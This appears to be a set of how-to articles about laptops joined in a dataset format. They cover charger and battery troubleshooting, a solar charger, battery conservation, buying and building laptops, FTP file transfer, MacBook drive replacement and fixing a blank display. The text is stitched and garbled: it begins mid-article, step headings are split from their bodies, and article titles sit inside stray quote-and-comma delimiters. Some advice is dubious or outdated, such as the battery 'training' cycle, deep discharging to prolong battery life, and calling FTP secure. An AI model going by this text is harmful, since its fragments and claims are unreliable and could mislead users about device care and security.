, Browsers, like people, need to be fresh and new to feel rejuvenated and be able to work again.

, Most browsers have ways to do this which are effective. Flushing your DNS Cache may also help.

, See if this improves things. It should. When you do bring them back, make sure to bring back items one at a time, closing and re-opening the web browser. When you find one that causes your browser to crash to another 502 error, disable and enable others, it may just be that certain add-on may have a problem or is outdated.

Some users report that a laptop power adapter can temporarily stop working to protect itself from a perceived issue with the power supply.If your battery is removable, take it out while the power source is disconnected. Hold down the laptop's power button for two minutes, put the battery back in, and plug it in to a new outlet.;
, Examine the entire length of the power cord for tears, dents, and worn-down insulation. If you notice any, or if the power brick is warped or smells like burnt plastic, the cord is probably faulty.You'll need to purchase a new cord for your laptop.


Check your warranty before replacing any parts. The cost may be covered under some circumstances.

, If the cord's attachment to your laptop wobbles or feels loose, there could be a problem with the connection. Unplug the cord, remove debris with a wooden toothpick, and remove heavy dust build-up with compressed air.


Bent pins and other damage issues are model-specific. Take the laptop or cord to a computer repair shop. You can look up your model online for repair instructions, but this can be difficult without proper tools, and may void the warranty.

, Shut down the computer, unplug it, then remove the battery from your laptop. The battery can usually be accessed from the underside of the laptop, and may have a lock you can turn with a coin, or release by lifting a lever. Leave the battery out for ten seconds, slot it back in, then start up your computer. Plug the laptop in again after start-up and wait ten seconds to see if it works.


Not all laptops have easily accessible batteries. If there is no obvious battery compartment, just restart your computer without removing the battery.

, If your laptop battery feels very hot to the touch, excess heat could be interfering with the charging process.Shut down the computer and let it sit for several minutes to cool down. If you haven't cleaned your laptop vents recently, blow a can of compressed air into the fan vents at an angle, in short bursts, to remove some dust.


Do not blow directly into the fan vents, only at an angle, or you could damage the fan.If you are comfortable disassembling your laptop, you can use the compressed air to blow away internal dust directly. Look up a guide to disassembly for your model before you begin, and work on a large, clear surface. This will likely void your warranty.

, Shut down the computer, remove the battery, and plug the computer in. If the computer won't turn on, you probably need a new cord. If you can start it up again in this situation, the charging issue is probably due to the battery itself, or your computer's interaction with the battery. The methods below may fix the problem, or your battery may be dead and require replacement.


If your laptop battery is not removable, skip this step and try the methods below before taking your laptop to a computer repair store.

, Sometimes the adapter (the box in the cord) is faulty, or despite your best efforts you can't repair a loose plug. Try borrowing a friend's charger, or asking an computer store employee to test your charger. If your charger is faulty, buy a new part from a computer or electronics store., Go to Start → Control Panel → Power Options. There may be a ""low battery level"" setting at too high a level, which can cause your computer to shut down instead of charge.The simplest way to deal with these settings is to restore them to the default.

, First, open ""Device Manager"". This can be found most easily with a Windows computer by using the search function, or by navigating to Start → Control Panel → System and Security → Device Manager., When the list has loaded, expand the ""Batteries Tab"".

, Right click ""Microsoft ACPI-Compliant Control Method Battery,"" then select ""Update Driver Software.""Follow the instructions that appear.

, Shut down the computer and start it up again, so the driver will take effect. If the laptop still won't charge, repeat the ""Update driver"" step on every entry in the Battery section, then restart your computer a second time.

, If you still cannot charge your laptop, try right-clicking ""Microsoft ACPI-Compliant Control Method Battery"" and selecting ""Uninstall."" When the process is finished, click the button on the toolbar that says 'Scan for hardware changes"" Alternately, you can open the ""Action"" tab and press Scan for hardware changes. Restart your computer once the driver is reinstalled.


This step requires an internet connection on your laptop.

, Open Systems Preferences from the Dock or your Applications folder. Click on Energy Saver and check both the ""Battery"" and ""Power Adapter"" setting tabs. In rare cases, a sleep setting set too low can look like a battery charging issue.In most cases, you'll need to try the additional steps below.

, Use one of these methods to reset the SMC, which controls battery management, battery status light:Laptops with a non-removable battery: Shut down the computer. Plug it into a power source. On the built-in keyboard, press the left-side shift control option keys and the laptop power button at the same time. Release the keys at the same time, then turn on your computer.

Start small until you understand what you are doing and work your way up.,
Ascertain exactly what your power requirements are.,
If you are designing for a single voltage/wattage combo, i.e., 12volt 12 watts, the conversion of Watts to Amps is governed by the equation Amps = Watts/Volts:


For example, 12 watts/12 volts = 1 amp - so there is your design spec, you need to build a device that will output 12 volts - if you want to charge the device directly from the solar panel without using the power adaptor that came with your device, you also need to understand what sort of charge cycle your battery requires.,
Read up on parallel and series wiring - which is not very complicated - basically if you tie the ""+"" of one solar cell to the ""-"" of the next solar cell and repeat this your voltage will be a multiple of the number of cells tied together - i.e.,
If you are building an ac voltage panel, add an inverter which converts d.c. to a.c. and supplies a clean sine wave so that any device you plug into the panel will operate properly.

",How to Build a Solar Powered Laptop Charger," Read more on the solar cell they are interested in using and read up on panel design techniques. Basically the solar cells must be mounted inside a housing which has to be sealed from the elements to prevent dust and condensation from forming on the cells which will reduce the power output severely.;
, If you are designing for a specific device, read the label on your device or its power supply; this will specify the voltage and watts required to charge your device. If you are trying to design a charger for multiply devices, you must use the maximum voltage and wattage of the most power hungry device in your target group. - it will require a sizable panel to charge multiple device simultaneously. If this is your goal, design the charger to produce 110 or 220, whichever is your normal power line voltage. Then just use the standard chargers and plug them into the panel - this will save you a lot of design time for making multiple d.c. voltages available for different devices, it will also give you more flexibility in adding future device.

, Different battery chemistries require different charging techniques. This wiki explains some of this: http://en.wikipedia.org/wiki/Trickle_charging.

, if each cell is .5 volts and you tie 24 cells together like this, you will have a panel that is wired in series and produces 12 volts (24 x .5) - this does not multiply wattage/amperage, only voltage. So if your cells output .5 volts and 10 watts, your panel will output 12 volts and 10 watts. To increase wattage you tie multiply panels together using parallel wiring, in parallel wiring you tie the ""+"" wires from the other panels together and the ""-"" wires together with the ""-"" wires from the other panels - do not tie the plus and minus together or you will short out your panels. So if you tie two panels together (each panel is wired in series) in parallel, you will now have an output of 12 volts and 20 watts. You use this technique to combine cells into panels to produce your desired output voltage/amperage/wattage per your spec.

'Turn on the device and let it exhaust the battery through normal usage.","How to ""Train"" a Cellphone or Laptop Battery"," Let your electronic device turn off by itself once the battery is ""dead"". It is important to start the process from this position because what you are really doing here is calibrating your device to know how much ""juice"" is in the battery. Your device needs to know what an exhausted battery ""feels like"", to know what the battery's range of charge can be.;
, Four bars on a cell phone, full battery on a laptop, whatever it may say, it is probably wrong - and you should be able to tell because the device will not hold a charge for as long as you would like.

,, You should allow a few (5-10) seconds to pass to let any static charge in the device to dissipate before you put it back in.

,, In most cases the device will again tell you that it is charging. Depending on the degradation of the battery, this charge MAY take as long as the initial charge did, or longer. Patience is paramount to success. Once the device again tells you it is fully charged.

, Each time you replace the battery and begin charging it again the time it takes for the device to tell you ""Fully Charged"" should be decreased. This is really where your patience is needed. You should not let the device stand idly telling you ""Full Charge"" for too long during this process. Try to stay involved with the device and your execution of these steps.

, Once you reach this point your battery should already display new life and last longer than before you started this process. Again it is important to let the battery fully ""die"" before you reattach the charger. Once your device has ""died"" and you ""Fully Charge"" it again, you may repeat steps 3-6 to determine whether or not the device is actually ""Fully Charged"".

Set up a blank screensaver.",How to Conserve Battery on a Windows Computer," There are generally two power plans in Windows. One is the Balanced Power plan and the other is the Power Saver plan. In addition to this, the user has an option to also create their own power plan based on the requirements.


The Balanced power plan is generally selected as the default power plan in Windows. This power plan puts the computer to sleep if the computer is idle. This is the best power plan because the brightness setting is more comfortable to use. The Balanced Power plan balances the computer's battery based on the usage.
The Power Saver plan works out quite well in cases when one wants to save battery at any cost. The brightness seem to be little dim when compared to the Balanced Power plan. The Power Saver plan also puts the computer to sleep when it's idle for a specified amount of time.;
, Apart from these power plans, you can also create your own power plan (based on the previous ones) and set your own parameters according to the requirements. These user-created power plans must have apt parameters or else the battery may drain out quick.

, Statistics say that display uses a major portion of your battery. Some computers try to adjust the brightness based on the light available in the room. It is best that the user sets the brightness level. Moreover, the brightness level must be set in such a way that the content that is displayed is visible to the user.


The apt brightness level for a computer running on battery is less than 30% and while charging is less than 80%.

, Set the sleep parameter to the minimum time possible, so that the computer need not stay awake while not in use. A minimum of 5 to 10 minutes duration is apt for the computer to be idle and then go to sleep. Completely turn off the laptop if you are planning to leave it for a long time.

, It's best to adjust the brightness level as per one's requirement at that particular point of time. Automatic brightness settings may seem to work out fine, but they can also lead to a drain in the battery level.

, Many people over-charge computers by connecting them to charge always. This is an errant practice. Draining the battery to a minimum of 10% to 5% and then recharging it will save the battery life.

, Certain components such as an optical mouse, external optical disk drive, external hard disk drive or a pen drive ought to be unplugged if not in use. When these devices are connected to a computer, the computer tends to allocate some amount of energy for them.

, Some people think that charging to 100% might drain out battery quickly. They are wrong. When a computer charges, it must be fully charged and then it must begin to discharge from the start. Ideally, charge while the computer is switched off and not in use.

, Nowadays most computers are equipped with a number of wireless component such as bluetooth, wi-fi adapters and so on. These wireless components also draw battery life. Turn off such components when not in use.

, It is recommended to open as few applications at a time as possible for a good battery life and to avoid heavy programs like Photoshop or Sony Vegas Professional on battery power. Hardcore gaming may also drain battery quickly.


Use lighter applications for daily tasks, such as internet browsing and playing music/videos. Waterfox's memory usage can reach up to one gigabyte, whereas Firefox's may peak at half of a gigabyte. Media Player Classic uses less system resources than Windows Media Player, the media player that comes with Windows.

, For example, try to use a track pad, touch pad or a tablet pen instead of going for an external optical mouse.

, If you have an animated screensaver or no screensaver at all, you could be wasting your battery.

Decide if you would like to buy used or new laptops.,
Look out for wholesale scams.,
Look for certified wholesalers.,
Buy refurbished laptops on Dell's auction site.,
Go to Alibaba.com to look for laptops through domestic and international suppliers.,
Call a computer company directly to inquire about bulk rates.,
Order laptops on eBay.,
Look on Liquidation.com and OnSale.com.",How to Buy Laptops in Bulk," Many businesses specialize in either 1 or the other. If you buy refurbished laptops, they are likely to be cheaper, but they may also be older with no warranties.;
, These are prevalent, because the majority of the wholesale electronics market has moved online. Watch out for these common scams as you look for bulk laptops.


Don't use any website that charges a membership fee, monthly fee or annual fee to buy electronics in bulk. Setup or other superfluous fees are likely to be a sign that the company is trying to get your financial information. You should not be paying them unless you directly purchase goods. One caveat is that if a wholesale distribution center is finding bulk laptops for you, they may ask for a deposit, which will later be used to pay part of your balance. Sending a check or PayPal payment will ensure they don't have your bank account details.
Beware of drop shipping scams. In this practice, you believe you are communicating with a wholesaler, but you are actually talking with a middleman who plans to use you to get clients, and arrange payment with themselves directly. Many people are fooled with ""work from home opportunities"" that leave them paying service fees and not making any money.
Sites that claim to be independent review sites are rarely independent. Companies pay to put up these sites that rate the products that earn them the highest commission as the best. Do not base your purchase on these sites.

, To avoid price mark-ups by middlemen and drop ship scams, you can vet your wholesalers according to independent verification. This should help you choose a wholesaler who sells straight from the manufacturer.

, On Dellauction.com, they auction off a high number of previously leased and used laptops. They are refurbished to Dell specifications and there is a 30-day money back guarantee on all purchases.

, Wholesalers and middlemen create accounts on this site. They offer products that often have a minimum order amount, and you can conduct your transaction in escrow.


In an escrow transaction, the money or bond is kept by a third party until the transaction is successfully completed. This is usually kept by banks or lending agencies who hold a bond for the wholesaler.
DHGate is another wholesaler that connects worldwide laptop suppliers. Although they don't advertise escrow transactions, some products come with a 7-day return or exchange guarantee. Look for this guarantee before purchasing in bulk.

, If you have chosen a specific laptop computer that you want to buy, then you are likely to get at least a 10 percent discount for buying more than 10 computers. Rates will vary between computer companies.

, This auction site often sells lots of 4 to 10 laptops to the highest bidder. Try to price out what you think older laptops are worth, so that you make a good bid.


eBay conducts transactions through PayPal, which can hold off some purchases for up to 2 weeks while you await shipment. If you have a problem with your order, you can submit a complaint through PayPal to have a judgment made on a return and refund.

, These Better Business Bureau accredited businesses may be able to supply bulk computers from a number of different companies. Make sure you learn about their return policy and any safety checks they have in place to ensure they have trusted sellers.

Choose a laptop with the operating system you prefer.,
Verify that the laptop comes with parts required for use.,
Buy a refurbished laptop from a certified or authorized refurbisher.,
Review the refurbished dealer's return and warranty policies.",How to Buy a Refurbished Laptop," You will want to buy a refurbished laptop that can meet your personal needs. For example, if you plan on using your laptop primarily for traveling, you may want to verify that the computer can efficiently connect to wireless internet.


Read system requirements on the packaging of software you use. If you plan on using specific software, you will want to buy a refurbished laptop with the system requirements that can efficiently handle your software.
Refurbished laptops with multiple features will usually be higher in price; so you may want to buy a laptop that contains only the minimum requirements and features you need.;
, For example, if you use Apple software that is exclusive to Macintosh operating systems, don't buy a laptop with a Windows operating system that is not compatible with your software.


Check to see if the laptop contains the most recent version of an operating system. Operating systems that have been released years previously may no longer function completely and may no longer receive support from the manufacturer. For example, you may want to buy a laptop with Windows 7 as opposed to Windows 2000, as most Windows 2000 products are outdated and no longer supported by Microsoft.

, For example, you may want to verify that the laptop has a power cord included so you do not have the order the part separately.

, Certified and authorized refurbishers thoroughly test each laptop before they are sold and are qualified to perform repairs. In most cases, certified refurbishers offer a product warranty.


Locate refurbished laptop dealers online or in your local area. Perform an Internet search using keywords such as ""authorized refurbisher"" to locate online dealers. You can also refer to your local phone directory to locate authorized dealers of refurbished laptops in your area.
If you are looking for a refurbished laptop by a specific manufacturer, use search terms such as ""Apple-certified technicians"" or ""Microsoft technology specialists"" to locate dealers knowledgeable in the laptop you want to buy.

Make sure the laptop has a good processor.,
Watch out for graphics.,
Get as much RAM as you can afford.,
Have a big Hard Drive.,
Buy laptops with extra years of guarantee.,
If you have extra money, buy a laptop with SSD hard drive.",How to Buy a Gaming Laptop," Intel is known for having better processors them AMD however AMD is much cheaper. Try getting an I5, I7 or R5 R7;
, If you have bad graphic card your laptop will not be able to run games. So, you have to watch out for that really carefully. Buy a laptop with AMD Radeon graphic card. Those are not so expensive and they are really good. I prefer at least model 7730M, it is not expensive and it can run most of games on high settings.

, Your gaming laptop has to have at least 4GB of RAM. If it doesn't, don't buy it. Best performance is with 8GB of RAM.

, It is not that important but you have to be aware that you can't put additional hard drives in laptops and you know that games require lot of space on hard drive. So if you run out of space, you will have to buy external hard drives which are not that fast when they are ""out"".

, Some companies offer 1 year and that is definitely not enough. At least 2 years of guarantee can guarantee you longer life. For example; DELL company offers laptops with 3 years of guarantee and they have really good laptops. You should probably check them out first.

, They are really fast and with that in your laptop, you are ready to go!

Choose a TI Firewire (1394) Chipset.,
Select Fast Hard Drives.,
Select an adequate CPU.,
Configure Power Saving Utilities.",How to Buy a Laptop Computer for Audio Recording," You need a machine that uses the Texas Instruments (TI) 1394 Chipset. Nearly all of the manufacturers of Firewire Audio Interfaces clearly state that their hardware ONLY works well with this chipset. All of the other chipsets out there (VIA, NEC, Ricoh, JMicron) seem to have problems ranging from audio dropouts, digital errors, software crashes to full blown system crashes and the infamous ""Blue Screen of Death."" Macs ships with the TI 1394 chipset as do some of the ""workstation"" classes of laptops by HP. Dell uses the Ricoh chipset which is seriously problematic if you actually want to use the firewire port to transfer audio data. If you already bought a notebook computer that has a problematic 1394 chipset, you may be able to Disable it in the Device Settings area of your control panel and purchase an ExpressCard 1394 with the TI chipset. I have been told that this only works is you have an Intel ExpressCard bus. (Thanks to ADK Pro Audio);
, Make sure that the hard drive that comes with the machine is at least 7200 RPM. Laptops are designed to minimize power consumption, which means that the preference will be for slow 4200 or 5200 RPM hard drives. This helps the battery last longer, but means that the drive probably can't keep up with your audio streams. No matter how fast your internal hard drive is, you should have your programs and operating system on one disk and your audio files on a different disk. Some laptops will allow for a second internal drive, which is great. Most people however opt to use an external hard drive either through USB 2.0 or through a firewire bus that is different from the one you are running on your audio interface.

, Current laptop processors range from the low-end AMD Sempron to the high-end Intel Core2 Extreme. The laptop market does not have the same diverse selection of processors as desktops, but purchasing a laptop with a low-end processor will slow down your encoding times. Look for a multi-core processor such as the AMD Athlon X2 models, or the Intel Core Duo and Core2 Duo/Extreme models, as most professional audio recording packages should support multi-threading. The speed of a processor is much less relevant than its architecture. For example, an Intel Pentium M 2.26GHz CPU will actually be slower than an Intel Core 2 Duo 1.8GHz, due to the architecture difference.

, You should be able to set up the laptop to run off of wall power and not battery power, if possible. Audio streaming requires lots of hard drive spinning and tons of processing power. These all take lots of power. When you run off of the battery, you are simply not getting enough power to do get your machine to perform. Set your Power Options to Maximum Performance. Make sure that you never let the machine turn off your hard disks, too. Most laptops have a ""4-Pin"" 1394 or Firewire jack. These do not send power out to the external devices. So you will need to power your firewire devices with an external power supply. Only a ""6 Pin"" 1394 jack will send power to the device, but laptops aren't designed to power additional devices. They simply don't have the power to spare. So even if you have a 6-Pin jack, be sure to power your external firewire devices with their own power supplies.

Battery life is also an important consideration; if you plan to roam around unplugged, you’ll want a laptop that doesn’t draw much power.;
, The shell that you purchase will be dependent on the processor that you want to install, so pick your processor first. Compare processor models to determine which processor offers the best speed versus cooling and power consumption. Most major online retailers will let you compare processors side-by-side.


Make sure that you are purchasing a mobile processor, and not a desktop processor.
There are two major processor manufacturers: Intel and AMD. There are plenty of arguments for and against each brand, but generally AMD will be less expensive. Do as much research as possible on the processor models you are interested in to be certain it is worth the money.

, The notebook shell will determine which parts you can use for the rest your laptop. The shell will come with the motherboard attached already, which will dictate what memory you can use.


Take screen size and keyboard layout into account as well. Since the shell is not particularly customizable, you will be stuck with the screen and keyboard you choose. A larger laptop will be more difficult to carry around, and will most likely be significantly heavier.
Finding shells for sale can be difficult. Enter “barebones notebook” or “whitebook shell” into your favorite search engine to track down retailers that stock shells. MSI is one of the few manufacturers that still makes barebones laptops.

, Your laptop will need memory to run, and the format of the memory is different than desktop. Look for SO-DIMM memory that will work with the motherboard in your shell. Faster memory will give better performance, but may lead to shorter battery life.


Try to get between 2-4 GB of memory for optimal everyday performance.

, Laptops typically use 2.5” drives, as opposed to the 3.5” drives found in desktops. You can choose between a standard 5400 RPM or 7200 RPM drive, or pick a solid state drive with no moving parts. The solid state drive (SSD) will typically be faster and has no moving parts, but they can be more difficult to use over long periods.

If you want a laptop to roam around, a SSD drive would be best, as it will not be physically damaged by impacts as much as a hard disk drive.

Get a hard drive with enough space for you to do what you want with the laptop. Most shells don’t have space for more than one drive, so it can be difficult to upgrade later. Make sure that there is enough room on the hard drive after the operating system installation (usually between 15-20 GB). Nowadays, most people choose from a 800GB-1.5TB range for laptops.

, Not all shells will fit a dedicated mobile graphics card. Instead, the graphics will be handled by the CPU's integrated graphics unit. If you can install a dedicated card, decide if you need one. They are most important for gamers and graphic designers.

, This is becoming more of an optional step as computers advance, since you can install operating systems from USB drives and download most software. If you buy a new laptop today, most do not have an optical drive, as disc memory is now replaced with memory cards and removable drives.


Some shells come with drives included. Not all notebook drives fit all shells, so make sure that the drive fits the shell you picked.
Choosing whether or not to buy one is easy. Consider whether you use disc memory often. Remember, you can use a USB external optical drive instead of a built-in optical drive.

, You will need to find one that has the correct shape and uses the same connector (laptop batteries have multiple pins. The battery contains ICs and the IC notifies the computer on temperature, and notify the computer if the battery is not working and should not be charged, and the battery percentage). If you plan to move it around often, use a long life battery. You will need to try comparing many batteries to find one to buy.

Buy one with good reviews. Read reviews on customer's experience with using those batteries.

, You’ll want a set of jeweler’s screwdrivers, preferably magnetic. Laptop screws are much smaller and harder to work with than desktop screws. Find a pair of needle-nose pliers to reach any screws that fall into cracks.


Keep your screws in plastic baggies until you need them. This will help keep them from rolling away or getting lost.

, Electrostatic discharge can quickly ruin computer components, so make sure that you are grounded before assembling your laptop. An antistatic wristband will keep you grounded and they are available for cheap.

, You will be accessing the motherboard from several removable plates in the back of the unit.

, This panel covers the 2.5” bay that will hold your hard drive. The location varies depending on the shell, but the bay is typically located towards the front of the laptop.

, Most notebooks require the hard drive to be mounted to a bracket that fits around the drive. Use four screws to make sure that the hard drive is secured to the bracket. The screw holes will typically ensure that you have it installed the correct direction.

, Use the grip tape to apply enough pressure to seat the drive. Most brackets will line up with two screw holes once the drive is in place. Insert screws to secure the drive.

, The method will vary depending on your shell, but they are typically inserted from the front of the bay opening, and they slide into SATA connectors.

, This panel will most likely be more difficult to remove than the hard drive panel. You may need to pry it open after removing all of the screws.

, Once the panel is open, you will have access to the motherboard and memory slots. Insert the SO-DIMM memory chips into their slots at an angle, and then push them down to click them into place. The memory sticks can only be installed in one direction, so don’t try to force them in.

, There may be a CPU lock around the socket where the CPU is installed. You may need to use a flathead screwdriver to turn it to the “unlocked” position.


Turn your CPU over so that you can see the pins. There should be one corner that is missing pins. This notch will line up with the notch on the socket.
The CPU will only fit in the socket one way. If the CPU does not seat itself, do not force it, or you may bend the pins, ruining the processor.
Once the CPU is inserted, put the CPU lock into the “locked” position.

, This fan either cools the CPU or cool the CPU and multiple other parts. Your CPU should have come packaged with a cooling fan. Most fans will have thermal paste already applied to the bottom where it connects with CPU. If the fan does not have any paste, you will need to apply some before the fan is installed.


Once the paste has been applied, you can install the fan. The exhaust must line up with the vents on your shell. This part can be tricky as you attempt to line everything up. Don’t try to force the heatsink and fan assembly in, but wiggle it in instead. There may be also some mounting bolts to place. If your case includes a bay to place fan dust filter, place a dust filter to prevent dust from clogging the heatsink.Keep the heatsink angled until you find the right position. This will help keep the thermal paste from getting all over your components.
Attach the fan’s power cable to the motherboard once the fan is installed. If you don’t connect the fan, the laptop will overheat and turn off after a few minutes of use.

, Once you have installed all of the components, you can place the panels back over the openings and secure them with screws. Your laptop is complete!

, It is easy to forget the battery in the build process, but make sure that it is inserted and charging properly before booting up the computer.

, Before you install an operating system, run Memtest86+ to ensure that your memory is working correctly, and that your computer is functioning in general. Memtest86+ can be downloaded for free online, and can be booted from a CD or USB drive.


You can also check that the memory you installed is recognized by using the BIOS. Find the Hardware or Monitor section to see if your memory appears.

, For self-built laptops, you can choose between Microsoft Windows or a Linux distribution. Windows costs money and has a reputation for being insecure, but it offers a larger range of program and hardware compatibility. Linux is free, more secure than Windows, and supported by a community of volunteer developers.


There are many versions of Linux to choose from, but some of the more popular include Ubuntu, Mint, and Debian.
It is recommended that you install the latest version of Windows released, as older versions lose support after enough time has passed.
If you don’t have an optical drive installed, you will need to create a bootable USB drive with your operating system files.

, Once your operating system is installed, you will need to install drivers for your hardware. Most modern operating systems will do most of this automatically, but you may have one or two components that need to be installed manually.


Most components will come with their drivers on a disc. Use the disc if your operating system cannot find the correct drivers.

The reason for this is that newer computers use UEFI (Unified Extensible Firmware Interface) instead of the traditional BIOS (Basic Input/Output System) to control power-on sequence for the computer. This helps Windows 8 computers boot quickly and securely into Windows, but makes changing the boot order more complicated. UEFI requires UEFI-compliant hardware and special configuration if you are building your own computer.;
, The CD will need to be programmed to be bootable in order to boot from it. Windows and Linux installation discs, as well as many computer utilities, are configured to be bootable. This means that they contain the necessary files to start the boot process.


If you're burning an ISO to a disc in attempt to make a bootable CD, you can use PowerISO to check if the disc image is bootable or not. When you load the ISO file into PowerISO, it will display whether or not it is bootable in the lower-left corner.
One of the easiest and quickest ways to check if a disc is bootable is to just try booting from it.

, You can open the Charms bar by moving your mouse to the upper-right corner of the screen or by pressing ⊞ Win+I

Use only a secure connection - don't try this over a public network.
Make sure to password-protect your user profiles on both computers for extra security.
Your server laptop is the one with the files, the client laptop is the one you want to transfer the files to.;
, The server computer is the one currently holding the files you want to transfer. You'll need to change the network settings by designating a workgroup name. This workgroup will act like a conference room where your two computers will meet. The name for the workgroup can be anything you decide.


In Windows OS, choose a workgroup name through ""computer domain and workgroup settings"". Applying this change will trigger a restart for your PC.
On a Mac, choose a workgroup name through System Preferences->Network->Advanced->WINS. Choose your workgroup name and apply the changes.In either case, make a mental note of the ""name"" of the the server computer.

, Go through the same network workgroup setup process on your client computer.

People with poor eyesight can even consider a 12"". Although that's not a netbook anymore, it's still more portable than a 15"" notebook. In that range, you also find better hardware specifications than the relative simple netbooks, but with a higher price tag as well.;
, Keep in mind that with time the battery performance will decrease. You take a netbook with you without the power adapter, so you need more autonomy. Some models are lifted higher up thanks to the bigger battery, providing better ventilation and a good grip to hold it better. In situations where you will work longer on your netbook than the expected battery duration, you can take the power supply with you OR a second battery.

,, SSD (Solid State Disk) boots faster and is more robust. On the other hand, HDD (hard disk drive) typically holds more and works better if you use demanding applications or download lots of music or videos. Adding a portable hard disk goes at expense of mobility.

First you'll work with the server computer - the one that has the files you want to transfer - in order to make it accessible. FTP is generally best if you feel you need recurring access between your two laptops.


On a Mac, go to System Preferences->Sharing->Services and check ""FTP Access"". Next click ""Start"" and wait for the change to apply. Note that this path may be slightly different in different versions of OSX.
In Windows, go to Control Panel->Programs->Programs and Features->Turn Windows features on or off. Next click the plus symbol next to ""Internet Information Services"" (IIS), then put a check next to ""FTP Server."" Click ""OK"".

, This is software that allows you to easily access FTP servers with only the server address or IP address. Popular ones include FileZilla, WinSCP, Cyberduck, and WebDrive., Now all you need to do is log in to the FTP server from the client computer and access your files for fast and secure transfer.


On a Mac, go to Finder->Go->Connect to Server. You will be prompted for the server or IP address of the server computer. Enter it and click ""Connect"".
In Windows, open your internet browser and type the server computer's IP address into the address bar directly. Go to File->Login As. Enter the username and password to log in.

Find a compatible storage device.,
Plug the storage device into the server computer.,
Move the files to the storage device.,
Eject the drive and connect to the client laptop.",How to Transfer Files Between Laptops3," External hard drives and other USB flash drives are sometimes formatted to work with one operating system (OSX or Windows) only. Depending on the computers you're transferring between you may need to reformat to a more universal formatting option (FAT32) before attempting the transfer. Using a storage device is one of the slowest methods for file transfer but may be the simplest to execute if you're feeling intimidated by the more technical methods.


If the storage device is recognized and the files are accessible on both computers, you can proceed.
If reformatting is necessary you can find more information at Format FAT32

The limitation of this method is typically speed, as numerous large files will take a significant amount of time to transfer in this fashion.

, Check that you have enough space on the storage device to house all the files you'd like to transfer before beginning. Your best bet is to know in advance how much space you will need and to plan accordingly.

, This process will be like other file management on your laptop - simply drag and drop the files you need and wait while they are fully transferred to the storage device.

, Make sure to disconnect properly to avoid damaging the files, then drag and drop to the client laptop's desktop or another more appropriate location.

Since your files are stored on the hard drive you are removing, you will need to back up any files you want to transfer to the new drive. This will make the operating system reinstall as painless as possible.


See this guide for detailed instructions on backing up your files.;
, Remove the power adapter cable. You must power down the Mac before opening the panel, or you run the risk of shorting out your components.


Note: You cannot remove the hard drive from any MacBook Pro with the Retina Display, as these use integrated flash memory as opposed to traditional hard drives.

, You will be accessing the back panel of the MacBook. Set it on a table or workbench that gives you easy access without having to bend over.

, These run along the edges of the bottom panel. The exact location of these screws varies by model, but there are always ten. You will need a Phillips screwdriver to remove them. There are usually two types of screws:


Seven 3 mm Phillips
Three 13.5 mm Phillips
The 13"" MacBook Pro may have slightly different screw configurations, but there will still be ten screws.

, Wedge your fingers into the gap between the vent and the lowercase and pry the panel up. You will release two clips securing the panel as you do so.

, This connector provides power to the logic board, and should be disconnected before continuing to prevent shorting out any components. It is black and located along the edge of the logic board, and is the largest connector attached. Make sure to pull the connector straight out so as not to damage the connection.


If there is a tab connected to the battery connector, use it to pull it out of the socket.
If there is no tab connected, you can use a spudger or cocktail pick to push the connector out.

, The hard drive is rectangular and will be located in one of the corners. Most hard drives have labels indicating their storage and speed, so check the label if you aren't sure. Many hard drives have shiny metal exposed, though not all of them do.

, There will be two small Phillips screws securing the hard drive into place. These two screws run alongside one edge of the hard drive, and must be removed to free the drive.


The screws will remain attached to the bracket that is holding the drive in place.

, Once you have loosened the screws, you can pull the bracket they are attached to directly out of the case.

, Gently pull the tab to extract the hard drive from the housing. Don't pull it all the way out, as there is still a cable attached underneath.


If there is no tab affixed you can use your fingers to gently lift the drive out.

, Grab both sides of the connector attached at the top of the hard drive. Pull it straight out of the hard drive. It may be securely connected, so ""walk"" the connector out by gently pulling alternate sides of the connector.


Pull the hard drive completely out of the MacBook so that you can access the screws on the sides of the drive.

, The hard drive will have four T6 Torx screws, two on each side. These are used to secure the drive in the bay. You will need to screw these into your new hard drive, so set them aside.You can also peel the pull tab off of the old drive and set it aside to stick to the new one.

, The hard drive must be a 2.5"" notebook drive up to 9.5 mm (0.37 inches) tall. It can be either a standard hard drive or a solid-state drive (SSD).


An SSD will provide significantly quicker loading times, but are typically much more expensive than traditional hard drives.

, Install the four Torx screws into the same holes that they came out of on the old drive. Hand-tighten them, but do not over-tighten as you could damage the hard drive case.


You can re-affix the pull tab too if you'd like. Stick it to the underside of the drive (making sure not to contact any circuitry) so that the tap sticks up when the drive is inserted.

, Insert the large hard drive connector directly into the slot at the top. It can only go in one direction. Make sure that the connector is secure and completely inserted.

, Gently rest the hard drive into the bay, ensuring that it is lined up properly. The Torx screws on each side should fit into grooves that keep the hard drive in place.

, Reinsert the bracket to the side of the drive and secure it with the two screws. Again, hand-tighten but do not over-tighten the screws.

, Reconnect the battery connector to the logic board. Make sure that you don't touch any of the circuitry, especially after the connector is reinserted.

, Return the back panel and secure it with the ten screws. Make sure that the back panel has clipped into place.

, When you install a new hard drive, you will need to reinstall the operating system. You can do this with the installation disc or over the internet if you have a network connection. See this guide for detailed instructions.

, If your old drive still works and you were simply upgrading to a larger or faster drive, you can turn your old drive into an external USB hard drive that you can take with you anywhere. All you need is a hard drive enclosure, which you can find at most computer hardware retailers.


See this guide for detailed instructions on turning your old drive into a portable USB drive.

,
Check to see whether you have a bad graphics card/video card.",How to Repair a Laptop Displaying a No Display Error," Check that the CPU fan is running. This may be enough to cause the screen to come back on.


Many laptops have the ability to dim the light on the LCD by pressing a certain key, so make sure that the laptop is not just dimmed down.

, On some laptops, the screen will not be recognized automatically and you may have to press a certain set of keys on the laptop. You may need to consult your computer's manual for further instructions.

, A bad RAM could be the cause.;
,


If you have two RAMs then remove both, and place back only one RAM.
Try them individually, then check the display.

, If you still have the same problem, remove the RAM from the slot. Clean it, and place it back in the same slot, or try another slot.

, Look for the VGA or the HDMI connector, connect it to the external monitor/TV then switch ON your laptop


If you failed to get the display on the external monitor, then use the proper combination keys ( Fn+F5 /the function key that has the monitor symbol on it) to toggle between your laptop screen and the external monitor.

If laptop is on but no display: If the external monitor works, this means the video card is just fine. Which leaves the screen, the motherboard connections, or the inverter.

, A laptop has a very tiny and long bulb which powers the screen, and when it burns out, the screen will go dark. Everything else is fine however, and it's only the bulb that needs replaced.

, If the bulb is burnt out, the computer should start up like normal including all of the lights, and the computer turning on. The only real difference is that the screen will be completely black and won't show any images.

, If you are able to make out a the background or at least see that there are some images, then you just have a burned out laptop LCD screen bulb.

